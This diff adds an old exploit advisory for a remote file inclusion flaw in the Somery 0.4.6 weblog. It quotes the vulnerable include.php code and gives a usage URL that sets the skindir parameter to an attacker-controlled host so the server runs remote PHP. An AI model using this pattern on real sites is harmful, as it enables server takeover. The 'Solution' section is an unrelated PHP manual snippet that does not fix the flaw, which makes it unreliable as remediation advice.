@@ -1,0 +1,67 @@
+Update:
+16:01 09/08/06
+
+Subject:
+"Somery 0.4(skin_dir)Remote File Inclusion Exploit"
+
+Vulnerable version:
+ Somery 0.4.6
+
+Operating System:
+- All OS
+
+Vendor URL:
+Robin de Graaf - voh@hostvoh.net
+Somery website - http://somery.danwa.net
+
+Description:
+Somery, also known as the Somery weblogging system.
+
+Vulnerability:
+An error accoured when sending a specified string code at include function
+Varibale scope at the line for request was not except how they handle failure.include() does not behave this way, the script will continue
+
+regardless.include() produces a Warning while require() results in a Fatal Error.
+see vulnerability script;
+
+// upload/admin/system/include.php
+
+if ($start) {
+       include("../config.php");
+       include("cookies.php");
+       include("system/error.php");
+       include("system/functions.php");
+       include("system/authorization.php");
+       include("$skindir/header.php"); // is invalid code
+} else {
+       if (!$checkauth) {
+               $login = TRUE;
+               include("login.php");
+       }
+       include("$skindir/footer.php"); // is invalid code
+}
+
+Exploit:
+//          =============XCRIME-CYBER============
+//          Somery 0.4(skin_dir)Remote File Inclusion Exploit
+//          ======================================
+//                              basher13 - Infam0us Gr0up
+Usage:
+http://[domain]/[path]/upload/admin/system/include.php?skindir=http://[url_inclusion_exploit]
+
+Solution:
+PHP Manual(PHP 3, PHP 4, PHP 5)
+Defined --  Checks whether a given named constant exists
+<?php
+/* Note the use of quotes, this is important.  This example is checking
+ * if the string 'CONSTANT' is the name of a constant named CONSTANT */
+if (defined('CONSTANT')) {
+   echo CONSTANT;
+}
+?>
+
+Published by:
+basher13 (Infam0us Gr0up - Securiti Research)
+basher13@linuxmail.org / www.xcrime-cyber.pro.tc
+
+# milw0rm.com [2006-09-08]
